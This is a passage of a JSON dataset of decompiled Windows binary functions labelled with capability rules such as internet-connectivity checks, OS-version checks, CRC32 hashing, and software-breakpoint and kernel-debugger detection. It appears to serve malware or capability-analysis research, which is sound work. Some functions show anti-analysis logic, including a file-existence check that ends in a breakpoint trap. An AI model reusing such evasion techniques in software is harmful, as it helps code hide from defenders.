}\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00434ab8:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.00420bc6(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3254
    },
    "00434b05": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00434b05(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4422ac;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4422a8 + -1;\n        iVar14 = *0x4422a8 + (*0x4422a8 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4422a8 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x00434c49;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x00434c50;\ncode_r0x00434c49:\n                        do {\n                            bVar6 = true;\ncode_r0x00434c50:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x00434c5e;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x00434c5e:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4422a4 - *0x4422a8) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4422a4 < iVar14) {\n                if (iVar14 < *0x4422a0) {\n                    iVar14 = iVar14 + *0x4422b4;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4422ac + (*0x4422ac >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4422ac + (*0x4422ac >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4422b4 + *0x4422a0;\n                }\n                goto code_r0x00435009;\n            }\n            iVar13 = *0x4422a4 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4422a8 + -1;\n            iVar13 = *0x4422a8 + (*0x4422a8 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4422a8 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x00434dfd;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x00434dfd:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4422ac + 1 + (*0x4422ac + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00435009:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4422b0 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4422b0 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.00420bc6(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3245
    },
    "00436906": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00436906(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    fcn.00422ead(arg_10h);\n    var_14h = fcn.0042bf1a(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004345b4(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043695f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043699f;\n        }\n        if (iVar1 != 2) {\ncode_r0x00436991:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0043699f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00436991;\n        goto code_r0x0043695f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0043699f:\n    fcn.00420bc6(unaff_EBX);\n    return;\n}\n",
        "token_count": 499
    },
    "004369ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004369ae(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    fcn.00422ead(arg_10h);\n    var_14h = fcn.0042bf1a(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00434b05(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00436a07:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00436a47;\n        }\n        if (iVar1 != 2) {\ncode_r0x00436a39:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00436a47;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00436a39;\n        goto code_r0x00436a07;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00436a47:\n    fcn.00420bc6(unaff_EBX);\n    return;\n}\n",
        "token_count": 501
    },
    "004020c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.004020c0(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    iVar3 = fcn.0041ff97(0x10);\n    iVar8 = 0;\n    do {\n        uVar4 = fcn.00420c76();\n        iVar7 = iVar8 + 1;\n        *(iVar8 + iVar3) = \"bcdfghklmnpqrstvwxz\"[uVar4 % 0x13] + -0x20;\n        iVar8 = iVar7;\n    } while (iVar7 < 2);\n    iVar8 = 2;\n    do {\n        iVar7 = fcn.00420c76();\n        iVar9 = iVar8 + 1;\n        *(iVar8 + iVar3) = iVar7 % 10 + '0';\n        iVar8 = iVar9;\n    } while (iVar9 < 6);\n    *(iVar9 + iVar3) = 0;\n    puVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        do {\n            cVar2 = *puVar5;\n            puVar5 = puVar5 + 1;\n        } while (cVar2 != '\\0');\n        uVar4 = puVar5 - in_EAX;\n        puVar5 = iVar3 + -1;\n        do {\n            pcVar1 = puVar5 + 1;\n            puVar5 = puVar5 + 1;\n        } while (*pcVar1 != '\\0');\n        for (uVar6 = uVar4 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar5 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            puVar5 = puVar5 + 1;\n        }\n        for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar5 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 532
    },
    "004076e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004076e0(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char *arg_10h;\n    char *arg_10h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = fcn.00420d1e(\"PROGRAMFILES\");\n    arg_10h_00 = fcn.00420d1e(\"SYSTEMDRIVE\");\n    pcVar3 = arg_10h;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    pcVar4 = arg_10h_00;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h = fcn.0041ff97(pcVar3 + pcVar4 + ((0x80 - (arg_10h_00 + 1)) - (arg_10h + 1)));\n    pcVar2 = _sym.imp.SHLWAPI.dll_PathFileExistsA;\n    iVar6 = 0;\n    do {\n        fcn.00420bd5(arg_8h, 0x43c26c, arg_10h);\n        iVar5 = (*pcVar2)(arg_8h);\n        if (iVar5 != 0) {\n            *0x444a86 = 1;\n            break;\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = 0;\n    do {\n        fcn.00420bd5(arg_8h, 0x43c26c, arg_10h_00);\n        iVar5 = (*pcVar2)(arg_8h);\n        if (iVar5 != 0) {\n            fcn.00420c59(arg_8h);\n            fcn.00423277(0);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 3);\n    fcn.00420c59(arg_8h);\n    return;\n}\n",
        "token_count": 641
    },
    "00401910": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401910(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    code **ppcVar1;\n    code **ppcVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_20h;\n    code **var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43803b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar1 = fcn.00422769(0x18);\n        var_4h = 0;\n        var_10h = ppcVar1;\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            fcn.004016b0(&var_44h);\n            ppcVar1[1] = NULL;\n            *ppcVar1 = vtable.std::ctype_char_.0;\n            ppcVar2 = fcn.004209b7(&var_20h);\n            ppcVar1[2] = *ppcVar2;\n            ppcVar1[3] = ppcVar2[1];\n            ppcVar1[4] = ppcVar2[2];\n            ppcVar1[5] = ppcVar2[3];\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = ppcVar1;\n        if (ppcVar1 != NULL) {\n            fcn.00401750(&var_44h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 416
    },
    "00404250": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404250(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    code **var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437e1b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar1 = fcn.00422769(8);\n        var_4h = 0;\n        var_10h = ppcVar1;\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            fcn.004016b0(&var_34h);\n            ppcVar1[1] = NULL;\n            *ppcVar1 = vtable.std::codecvt_char__char__int_.0;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = ppcVar1;\n        if (ppcVar1 != NULL) {\n            fcn.00401750(&var_34h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 323
    },
    "00422769": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422769(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.00422819(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00429cc7(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x443cc8 & 1) == 0) {\n        *0x443cc8 = *0x443cc8 | 1;\n        var_4h = \"bad allocation\";\n        fcn.0042100c(&var_4h);\n        *0x443cbc = vtable.std::bad_alloc.0;\n        fcn.00422a7d(0x43878c);\n    }\n    fcn.00421140(0x443cbc);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.00424181(&var_10h, 0x43f8b4);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 270
    },
    "004289bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004289bc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f378, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00426e1d();\n        *puVar2 = 0;\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x444b6c)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x444b80;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043289b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00426e0a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00426e1d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.004282bf(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00428a88();\n                goto code_r0x00428a7f;\n            }\n        }\n        puVar2 = fcn.00426e1d();\n        *puVar2 = 0;\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 9;\n        fcn.00426db8();\n    }\ncode_r0x00428a7f:\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 616
    },
    "0042997f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042997f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f3f8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00426e1d();\n        *puVar2 = 0;\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x444b6c)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x444b80;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043289b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00426e0a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00426e1d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0042990a(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00429a4b();\n                goto code_r0x00429a42;\n            }\n        }\n        puVar2 = fcn.00426e1d();\n        *puVar2 = 0;\n        puVar2 = fcn.00426e0a();\n        *puVar2 = 9;\n        fcn.00426db8();\n    }\ncode_r0x00429a42:\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 619
    },
    "0042d139": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d139(int32_t lpFileName, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    if ((lpFileName == 0) || ((arg_ch & 0xfffffff9) != 0)) {\n        puVar1 = fcn.00426e1d();\n        *puVar1 = 0;\n        puVar1 = fcn.00426e0a();\n        uVar3 = 0x16;\n        *puVar1 = 0x16;\n        fcn.00426db8();\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.DLL_GetFileAttributesA)(lpFileName);\n        if (uVar2 == 0xffffffff) {\n            uVar3 = (*_sym.imp.KERNEL32.DLL_GetLastError)();\n            fcn.00426e30(uVar3);\n        }\n        else {\n            if ((((uVar2 & 0x10) != 0) || ((uVar2 & 1) == 0)) || ((arg_ch & 2) == 0)) {\n                return 0;\n            }\n            puVar1 = fcn.00426e1d();\n            *puVar1 = 5;\n            puVar1 = fcn.00426e0a();\n            *puVar1 = 0xd;\n        }\n        puVar1 = fcn.00426e0a();\n        uVar3 = *puVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 342
    },
    "00401850": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401850(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00420756(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.0042077e();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 130
    },
    "004018a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004018a0(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    uVar1 = *param_1;\n    if (uVar1 != 0) {\n        fcn.00420756(0);\n        iVar2 = *(uVar1 + 4);\n        if ((iVar2 != 0) && (iVar2 != -1)) {\n            *(uVar1 + 4) = iVar2 + -1;\n        }\n        iVar2 = *(uVar1 + 4);\n        fcn.0042077e();\n        puVar3 = ~-(iVar2 != 0) & uVar1;\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00401c30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00401c30(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar1 = **(in_EAX + 0x30);\n    *unaff_EDI = iVar1;\n    fcn.00420756(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042077e();\n    return;\n}\n",
        "token_count": 129
    },
    "00401c70": {
        "rules": [
